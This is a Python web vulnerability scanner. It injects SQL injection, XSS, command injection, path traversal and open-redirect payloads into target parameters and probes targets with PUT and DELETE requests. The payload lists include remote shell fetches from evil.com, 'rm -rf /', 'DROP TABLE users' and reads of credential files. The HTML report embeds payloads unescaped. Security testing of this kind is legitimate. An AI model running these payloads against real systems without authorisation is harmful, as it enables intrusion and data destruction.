#!/usr/bin/env python3
"""
Advanced Vulnerability Scanner for Web Applications
Comprehensive security testing module for penetration testing.
"""

import asyncio
import json
import logging
import re
import time
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import hashlib
import base64

import aiohttp
from bs4 import BeautifulSoup


class VulnerabilityScanner:
    """Advanced vulnerability scanner for web applications."""

    def __init__(self, config: Dict):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.vulnerabilities: List[Dict] = []
        self.session = None

        # Initialize payload databases
        self.payloads = self._load_payloads()

        # Scan statistics
        self.stats = {
            'urls_scanned': 0,
            'vulnerabilities_found': 0,
            'tests_performed': 0,
            'start_time': None,
            'end_time': None
        }

    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load vulnerability payloads for different attack types."""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "1' OR '1' = '1",
                "' UNION SELECT NULL --",
                "1; DROP TABLE users --",
                "' AND 1=0 UNION SELECT username, password FROM users --",
                "admin' --",
                "' OR 1=1#",
                "1' ORDER BY 1 --",
                "' GROUP BY CONCAT_WS(0x3a, user(), database(), version()) --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "'><script>alert('XSS')</script>",
                "<body onload=alert('XSS')>",
                "<input type=text value=<script>alert('XSS')</script>>",
                "<div style=\"background-image: url(javascript:alert('XSS'))\">",
                "<object data=javascript:alert('XSS')></object>"
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "; id",
                "| uname -a",
                "; ping -c 1 127.0.0.1",
                "`wget http://evil.com/shell.sh`",
                "$(curl http://evil.com/shell.sh)",
                "; rm -rf /"
            ],
            'directory_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "../../../../etc/shadow",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//etc/passwd",
                "..\\..\\..\\..\\..\\..\\windows\\win.ini",
                "/../../../../../../etc/passwd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            'open_redirect': [
                "//evil.com",
                "http://evil.com",
                "https://evil.com",
                "//google.com",
                "http://google.com",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "/\\evil.com",
                "/redirect?url=http://evil.com",
                "?url=http://evil.com"
            ],
            'csrf_tokens': [
                # Test for missing CSRF tokens
            ],
            'file_upload': [
                "shell.php",
                "shell.asp",
                "shell.aspx",
                "shell.jsp",
                "malicious.exe",
                "webshell.php.jpg",
                "test.php.png",
                "evil.php%00.jpg"
            ]
        }

    def _generate_unique_id(self, vuln_type: str, url: str, payload: str) -> str:
        """Generate unique ID for vulnerability."""
        content = f"{vuln_type}:{url}:{payload}"
        return hashlib.md5(content.encode()).hexdigest()

    async def _test_parameter(self, session: aiohttp.ClientSession, base_url: str,
                           param: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """Test a single parameter with a payload."""
        try:
            parsed = urlparse(base_url)
            query_params = parse_qs(parsed.query)

            # Inject payload into parameter
            query_params[param] = [payload]

            # Reconstruct URL
            new_query = urlencode(query_params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()

            # Send request
            headers = self.config.get('headers', {}).copy()
            headers['User-Agent'] = self.config.get('user_agent', 'VulnScanner/1.0')

            async with session.get(test_url, headers=headers, timeout=10) as response:
                content = await response.text()
                return await self._analyze_response(vuln_type, test_url, payload, response, content)

        except Exception as e:
            self.logger.debug(f"Error testing parameter {param}: {e}")
            return None

    async def _test_post_parameter(self, session: aiohttp.ClientSession, base_url: str,
                                 param: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """Test POST parameter with payload."""
        try:
            data = {param: payload}

            headers = self.config.get('headers', {}).copy()
            headers['User-Agent'] = self.config.get('user_agent', 'VulnScanner/1.0')
            headers['Content-Type'] = 'application/x-www-form-urlencoded'

            async with session.post(base_url, data=data, headers=headers, timeout=10) as response:
                content = await response.text()
                return await self._analyze_response(vuln_type, base_url, payload, response, content)

        except Exception as e:
            self.logger.debug(f"Error testing POST parameter {param}: {e}")
            return None

    async def _analyze_response(self, vuln_type: str, url: str, payload: str,
                              response: aiohttp.ClientResponse, content: str) -> Optional[Dict]:
        """Analyze response for vulnerability indicators."""
        vuln_indicators = {
            'sqli': self._check_sqli_indicators,
            'xss': self._check_xss_indicators,
            'command_injection': self._check_command_injection_indicators,
            'directory_traversal': self._check_directory_traversal_indicators,
            'open_redirect': self._check_open_redirect_indicators
        }

        if vuln_type in vuln_indicators:
            is_vulnerable, confidence, details = vuln_indicators[vuln_type](response, content, payload)

            if is_vulnerable:
                vuln_id = self._generate_unique_id(vuln_type, url, payload)
                vulnerability = {
                    'id': vuln_id,
                    'type': vuln_type,
                    'url': url,
                    'parameter': self._extract_parameter(url),
                    'payload': payload,
                    'confidence': confidence,
                    'details': details,
                    'status_code': response.status,
                    'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                    'timestamp': time.time(),
                    'severity': self._calculate_severity(vuln_type, confidence)
                }
                return vulnerability

        return None

    def _extract_parameter(self, url: str) -> Optional[str]:
        """Extract parameter name from URL."""
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            return list(params.keys())[0] if params else ""
        return ""

    def _check_sqli_indicators(self, response: aiohttp.ClientResponse, content: str, payload: str) -> Tuple[bool, float, Dict]:
        """Check for SQL injection indicators."""
        indicators = {
            'sql_errors': [
                'sql syntax', 'mysql error', 'postgresql error', 'sqlite error',
                'ora-', 'microsoft sql', 'syntax error', 'unclosed quotation',
                'you have an error in your sql syntax'
            ],
            'database_info': [
                'version()', 'database()', 'user()', '@version', '@@version'
            ],
            'union_success': [
                'union select', 'union all select'
            ]
        }

        content_lower = content.lower()
        confidence = 0.0
        details = {}

        # Check for SQL errors
        for error in indicators['sql_errors']:
            if error in content_lower:
                confidence += 0.8
                details['sql_error'] = error
                break

        # Check for database information disclosure
        for info in indicators['database_info']:
            if info in content_lower:
                confidence += 0.6
                details['db_info_disclosure'] = info

        # Check for successful UNION attacks
        for union in indicators['union_success']:
            if union in payload.lower() and response.status == 200:
                confidence += 0.7
                details['union_attack'] = 'successful'

        # Check for unusual response content
        if len(content) > 10000 and 'select' in payload.lower():
            confidence += 0.3
            details['unusual_response_length'] = len(content)

        return confidence > 0.5, min(confidence, 1.0), details

    def _check_xss_indicators(self, response: aiohttp.ClientResponse, content: str, payload: str) -> Tuple[bool, float, Dict]:
        """Check for XSS indicators."""
        # If payload appears in response without encoding, it's likely vulnerable
        if payload in content:
            # Check if it's properly encoded
            encoded_payload = content.replace('<', '&lt;').replace('>', '&gt;')
            if payload in encoded_payload:
                return False, 0.0, {}

            # Check for script execution indicators
            script_indicators = ['alert(', 'javascript:', 'onload=', 'onerror=']
            for indicator in script_indicators:
                if indicator in payload and indicator in content:
                    return True, 0.9, {'script_execution': indicator}

            return True, 0.7, {'payload_reflected': True}

        return False, 0.0, {}

    def _check_command_injection_indicators(self, response: aiohttp.ClientResponse, content: str, payload: str) -> Tuple[bool, float, Dict]:
        """Check for command injection indicators."""
        command_outputs = [
            'uid=', 'gid=', 'groups=', 'root:', 'bin/bash', 'bin/sh',
            'linux', 'unix', 'darwin', 'freebsd', 'windows'
        ]

        content_lower = content.lower()
        confidence = 0.0
        details = {}

        # Check for command execution results
        for output in command_outputs:
            if output in content_lower:
                confidence += 0.8
                details['command_output'] = output
                break

        # Check for command injection patterns
        if any(cmd in payload for cmd in [';', '|', '`', '$(']):
            if response.status in [200, 500] and len(content) > 100:
                confidence += 0.6
                details['injection_pattern'] = 'detected'

        # Time-based detection (if response time is unusual)
        if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > 5:
            confidence += 0.4
            details['time_delay'] = response.elapsed.total_seconds()

        return confidence > 0.5, min(confidence, 1.0), details

    def _check_directory_traversal_indicators(self, response: aiohttp.ClientResponse, content: str, payload: str) -> Tuple[bool, float, Dict]:
        """Check for directory traversal indicators."""
        file_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:', 'sync:',  # /etc/passwd content
            '[boot loader]', '[operating systems]',       # Windows boot.ini
            'drivers', 'system32', 'windows',             # Windows paths
            '#!/bin/bash', '#!/bin/sh',                   # Script files
            '<?php', '<?xml',                             # Web files
        ]

        confidence = 0.0
        details = {}

        content_lower = content.lower()

        # Check for file content indicators
        for indicator in file_indicators:
            if indicator in content_lower:
                confidence += 0.9
                details['file_content'] = indicator
                break

        # Check for traversal patterns
        if '../' in payload or '..\\' in payload:
            if response.status == 200 and len(content) > 50:
                confidence += 0.7
                details['traversal_pattern'] = 'successful'

        # Check for error messages
        error_patterns = ['no such file', 'permission denied', 'access denied']
        for error in error_patterns:
            if error in content_lower:
                confidence += 0.3
                details['error_message'] = error

        return confidence > 0.5, min(confidence, 1.0), details

    def _check_open_redirect_indicators(self, response: aiohttp.ClientResponse, content: str, payload: str) -> Tuple[bool, float, Dict]:
        """Check for open redirect indicators."""
        redirect_indicators = [
            'location: http', 'location: //', 'redirect', 'location.href',
            'window.location', 'document.location'
        ]

        confidence = 0.0
        details = {}

        # Check for redirect headers
        location = response.headers.get('Location', '')
        if location and any(domain in location.lower() for domain in ['evil.com', 'google.com']):
            confidence += 0.9
            details['redirect_location'] = location

        # Check for redirect in content
        content_lower = content.lower()
        for indicator in redirect_indicators:
            if indicator in content_lower:
                confidence += 0.6
                details['redirect_indicator'] = indicator

        # Check for external domains in payload
        if any(domain in payload for domain in ['evil.com', 'google.com']):
            if response.status in [301, 302, 303, 307, 308]:
                confidence += 0.8
                details['redirect_status'] = response.status

        return confidence > 0.6, min(confidence, 1.0), details

    def _calculate_severity(self, vuln_type: str, confidence: float) -> str:
        """Calculate vulnerability severity."""
        severity_map = {
            'sqli': 'high',
            'xss': 'high',
            'command_injection': 'critical',
            'directory_traversal': 'high',
            'open_redirect': 'medium'
        }

        base_severity = severity_map.get(vuln_type, 'low')

        # Adjust based on confidence
        if confidence > 0.8:
            return 'critical' if base_severity == 'high' else base_severity
        elif confidence > 0.6:
            return base_severity
        else:
            return 'low'

    async def scan_url(self, session: aiohttp.ClientSession, url: str, vuln_types: List[str] = None) -> List[Dict]:
        """Scan a single URL for vulnerabilities."""
        if vuln_types is None:
            vuln_types = ['sqli', 'xss', 'command_injection', 'directory_traversal', 'open_redirect']

        vulnerabilities = []
        parsed = urlparse(url)

        # Extract parameters for testing
        if parsed.query:
            params = parse_qs(parsed.query)

            for vuln_type in vuln_types:
                if vuln_type not in self.payloads:
                    continue

                for param in params.keys():
                    for payload in self.payloads[vuln_type][:3]:  # Limit payloads for efficiency
                        self.stats['tests_performed'] += 1

                        vuln = await self._test_parameter(session, url, param, payload, vuln_type)
                        if vuln:
                            vulnerabilities.append(vuln)
                            self.logger.info(f"Vulnerability found: {vuln_type} in {url}")

                        # Small delay to avoid overwhelming the target
                        await asyncio.sleep(0.1)

        # Test POST parameters if it's a form endpoint
        for vuln_type in ['sqli', 'xss']:
            if vuln_type in self.payloads:
                # Common form parameters to test
                form_params = ['search', 'query', 'input', 'data', 'text']

                for param in form_params:
                    for payload in self.payloads[vuln_type][:2]:
                        self.stats['tests_performed'] += 1

                        vuln = await self._test_post_parameter(session, url, param, payload, vuln_type)
                        if vuln:
                            vulnerabilities.append(vuln)
                            self.logger.info(f"POST vulnerability found: {vuln_type} in {url}")

                        await asyncio.sleep(0.1)

        self.stats['urls_scanned'] += 1
        return vulnerabilities

    async def scan_security_headers(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Check for security headers."""
        vulnerabilities = []

        try:
            headers = self.config.get('headers', {}).copy()
            headers['User-Agent'] = self.config.get('user_agent', 'VulnScanner/1.0')

            async with session.get(url, headers=headers, timeout=10) as response:
                headers = dict(response.headers)
                missing_headers = self._check_missing_security_headers(headers)

                for header_issue in missing_headers:
                    vuln_id = self._generate_unique_id('missing_header', url, header_issue['header'])
                    vulnerability = {
                        'id': vuln_id,
                        'type': 'missing_security_header',
                        'url': url,
                        'parameter': None,
                        'payload': None,
                        'confidence': 1.0,
                        'details': header_issue,
                        'status_code': response.status,
                        'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                        'timestamp': time.time(),
                        'severity': 'medium'
                    }
                    vulnerabilities.append(vulnerability)

        except Exception as e:
            self.logger.debug(f"Error checking security headers for {url}: {e}")

        return vulnerabilities

    def _check_missing_security_headers(self, headers: Dict[str, str]) -> List[Dict]:
        """Check for missing security headers."""
        required_headers = {
            'X-Frame-Options': 'Prevents clickjacking attacks',
            'X-Content-Type-Options': 'Prevents MIME type sniffing',
            'X-XSS-Protection': 'Enables XSS filtering',
            'Strict-Transport-Security': 'Enforces HTTPS',
            'Content-Security-Policy': 'Prevents XSS and injection attacks',
            'Referrer-Policy': 'Controls referrer information',
            'Permissions-Policy': 'Controls browser features'
        }

        missing = []
        for header, description in required_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                missing.append({
                    'header': header,
                    'description': description,
                    'impact': 'Potential security vulnerability'
                })

        return missing

    async def scan_http_methods(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Test for dangerous HTTP methods."""
        vulnerabilities = []
        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS']

        for method in dangerous_methods:
            try:
                headers = self.config.get('headers', {}).copy()
                headers['User-Agent'] = self.config.get('user_agent', 'VulnScanner/1.0')

                async with session.request(method, url, headers=headers, timeout=10) as response:
                    if response.status not in [401, 403, 405]:  # Method not allowed
                        vuln_id = self._generate_unique_id('dangerous_method', url, method)
                        vulnerability = {
                            'id': vuln_id,
                            'type': 'dangerous_http_method',
                            'url': url,
                            'parameter': None,
                            'payload': method,
                            'confidence': 0.8,
                            'details': {
                                'method': method,
                                'status_code': response.status,
                                'allowed': True
                            },
                            'status_code': response.status,
                            'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                            'timestamp': time.time(),
                            'severity': 'medium'
                        }
                        vulnerabilities.append(vulnerability)
                        self.logger.info(f"Dangerous HTTP method allowed: {method} on {url}")

            except Exception as e:
                self.logger.debug(f"Error testing method {method} on {url}: {e}")

        return vulnerabilities

    async def comprehensive_scan(self, urls: List[str]) -> Dict:
        """Perform comprehensive vulnerability scan on multiple URLs."""
        self.stats['start_time'] = time.time()
        all_vulnerabilities = []

        connector = aiohttp.TCPConnector(limit=10)  # Limit concurrent connections

        async with aiohttp.ClientSession(connector=connector) as session:
            for url in urls:
                self.logger.info(f"Scanning URL: {url}")

                # Vulnerability scanning
                vuln_results = await self.scan_url(session, url)
                all_vulnerabilities.extend(vuln_results)

                # Security headers check
                header_results = await self.scan_security_headers(session, url)
                all_vulnerabilities.extend(header_results)

                # HTTP methods test
                method_results = await self.scan_http_methods(session, url)
                all_vulnerabilities.extend(method_results)

                # Respect rate limiting
                await asyncio.sleep(self.config.get('scan_delay', 1.0))

        self.stats['end_time'] = time.time()
        self.stats['vulnerabilities_found'] = len(all_vulnerabilities)
        self.vulnerabilities = all_vulnerabilities

        return {
            'vulnerabilities': all_vulnerabilities,
            'stats': self.stats,
            'scan_duration': self.stats['end_time'] - self.stats['start_time']
        }

    def generate_report(self, output_format: str = 'json') -> str:
        """Generate vulnerability report."""
        if output_format == 'json':
            return json.dumps({
                'scan_summary': self.stats,
                'vulnerabilities': self.vulnerabilities
            }, indent=2, default=str)

        elif output_format == 'html':
            return self._generate_html_report()

        elif output_format == 'txt':
            return self._generate_text_report()

        else:
            raise ValueError(f"Unsupported format: {output_format}")

    def _generate_html_report(self) -> str:
        """Generate HTML vulnerability report."""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Vulnerability Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .vulnerability {{ border: 1px solid #ccc; margin: 10px 0; padding: 15px; border-radius: 5px; }}
                .critical {{ border-color: #ff0000; background: #ffeaea; }}
                .high {{ border-color: #ff6600; background: #fff2e6; }}
                .medium {{ border-color: #ffcc00; background: #fffde6; }}
                .low {{ border-color: #666; background: #f5f5f5; }}
                .stats {{ background: #e6f3ff; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Vulnerability Scan Report</h1>
                <p>Generated on: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>

            <div class="stats">
                <h2>Scan Statistics</h2>
                <p>URLs Scanned: {self.stats['urls_scanned']}</p>
                <p>Vulnerabilities Found: {self.stats['vulnerabilities_found']}</p>
                <p>Tests Performed: {self.stats['tests_performed']}</p>
                <p>Scan Duration: {self.stats.get('scan_duration', 0):.2f} seconds</p>
            </div>

            <h2>Vulnerabilities</h2>
        """

        severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        sorted_vulns = sorted(self.vulnerabilities, key=lambda x: severity_order.get(x['severity'], 4))

        for vuln in sorted_vulns:
            html += f"""
            <div class="vulnerability {vuln['severity']}">
                <h3>{vuln['type'].upper()} - {vuln['severity'].upper()}</h3>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Confidence:</strong> {vuln['confidence']:.2%}</p>
                {f"<p><strong>Parameter:</strong> {vuln['parameter']}</p>" if vuln['parameter'] else ""}
                {f"<p><strong>Payload:</strong> {vuln['payload']}</p>" if vuln['payload'] else ""}
                <p><strong>Details:</strong> {vuln['details']}</p>
            </div>
            """

        html += """
        </body>
        </html>
        """
        return html

    def _generate_text_report(self) -> str:
        """Generate text vulnerability report."""
        report = f"""
VULNERABILITY SCAN REPORT
{'='*50}
Generated on: {time.strftime('%Y-%m-%d %H:%M:%S')}

SCAN STATISTICS
{'-'*20}
URLs Scanned: {self.stats['urls_scanned']}
Vulnerabilities Found: {self.stats['vulnerabilities_found']}
Tests Performed: {self.stats['tests_performed']}
Scan Duration: {self.stats.get('scan_duration', 0):.2f} seconds

VULNERABILITIES
{'-'*20}
"""

        severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        sorted_vulns = sorted(self.vulnerabilities, key=lambda x: severity_order.get(x['severity'], 4))

        for vuln in sorted_vulns:
            report += f"""

Type: {vuln['type'].upper()}
Severity: {vuln['severity'].upper()}
URL: {vuln['url']}
Confidence: {vuln['confidence']:.2%}
"""
            if vuln['parameter']:
                report += f"Parameter: {vuln['parameter']}\n"
            if vuln['payload']:
                report += f"Payload: {vuln['payload']}\n"
            report += f"Details: {vuln['details']}\n"

        return report
